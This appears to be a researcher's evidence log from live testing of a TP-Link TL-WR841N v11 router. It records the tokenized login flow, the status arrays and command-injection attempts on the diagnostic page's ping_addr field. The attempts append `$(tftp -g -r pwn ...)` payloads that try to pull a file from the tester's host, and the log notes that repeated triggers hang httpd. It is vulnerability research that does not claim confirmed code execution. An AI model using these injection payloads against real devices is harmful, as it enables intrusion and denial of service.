# Live Web Evidence — TL-WR841N v11 (post power-cycle)

Capture: 2026-09-12T08:18:26Z UTC
Host: 192.168.0.100/24 (eth1), curl with cookie Authorization=Basic YWRtaW46... and tokenized Referer.

## Login flow (works)
GET /userRpm/LoginRpm.htm?Save=Save with Authorization cookie -> JS redirect to /<16-char TOKEN>/userRpm/Index.htm.
Token example used this session: QKZJKHHAAPKIMGDA (fresh each login).
All /userRpm pages served under /<TOKEN>/userRpm/*.htm with Referer: http://192.168.0.1/<TOKEN>/userRpm/Index.htm.

## httpd stability after reboot
| page | HTTP | size | time |
|---|---|---|---|
| StatusRpm.htm | 200 | 25756 | 21ms |
| WlanNetworkRpm.htm | 200 | (post-login) | 12ms |
| WanCfgRpm.htm | 200 | ... | 21ms |
| DhcpCfgRpm.htm | 200 | ... | 12ms |
| Index.htm (tokenized) | 200 | 2441 | 13ms |

(load tested 1x each; tiny 202B responses earlier were the "session expired -> reload from root" JS page.)

## Live status arrays (StatusRpm.htm)
statusPara = [1,1,22,20000,446,"3.16.9 Build 160325 Rel.62500n ","WR841N v11 00000000",1,0,3,0,0]
lanPara = ["98-DE-D0-D4-05-C6","192.168.0.1","255.255.255.0",0,0]
wlanPara = [0,"TP-LINK_05C6",15,2,"98-DE-D0-D4-05-C6","192.168.0.1",1,8,0,0,6,"","","",1,0,1,0,"",0,0]
wanPara = [4,"98-DE-D0-D4-05-C7","0.0.0.0",1,"0.0.0.0",0,0,"0.0.0.0",3,1,2,"0.0.0.0 , 0.0.0.0","",0,0,"0.0.0.0","0.0.0.0",0,0,0,0,0,0,0]

Interpretation:
- Status 22/20000/446: uptime-scaled + wireless stats fields; board "WR841N v11".
- wlanPara[1]="TP-LINK_05C6" -> SSID restored to stock value after tests (config restored).
- wanPara[0]=4 -> WAN mode 4 = AP Client / Universal Repeater. WAN MAC = 98:DE:D0:D4:05:C7. No WAN IP (0.0.0.0) because this unit is repeating the home AP.

## Diagnostic page (PingIframeRpm) — system() sink, empirical behavior
- Form fields on DiagnosticRpm.htm: pingAddr (free text, maxlength=50), doType (ping|tracert), sendNum, pSize, overTime, trHops.
- JS submits: /<TOKEN>/userRpm/PingIframeRpm.htm?ping_addr=<pingAddr>&doType=...&isNew=new|old&sendNum=...&pSize=...&overTime=...&trHops=...
- Control (benign): GET PingIframeRpm.htm?ping_addr=192.168.0.100&doType=ping&isNew=new&sendNum=1&pSize=64&overTime=1&trHops=5
  -> HTTP 200, diagnostic_para array echo present; ping result zeros (IPv6/no route context).
- Injection attempt 1 (`$(tftp -r ...)` appended): HTTP 200, diagnostic_para=[0,1,53,0,0]; NO TFTP callback to host UDP69.
- Injection attempt 2 (`$(tftp -g -r pwn 192.168.0.100)` appended): HTTP 200 interleaved; NO TFTP callback (tftp.log empty).
- IMPORTANT: two consecutive diagnostic triggers (isNew=new) LEFT HTTPD WEDGED on device (TCP 80 SYN-acked, no HTTP response, single worker). Recovered only by physical power-cycle. Empirically confirms the diagnostic handler is synchronous system() inside the single httpd worker -> page reload "takes a while" / hangs.
- NOT yet a confirmed RCE: no outbound TFTP/execution artifact observed from the device for these payloads. The earlier assumption that "busybox tftp usage echoed from the ROUTER" was WRONG — that usage string came from the local host's /usr/bin/tftp (self-inflicted, heredoc/echo expansion). No device-side execution has been observed. Verdict pending: requires a device-side observable (UART serial console log or dropbear connect) — see findings log.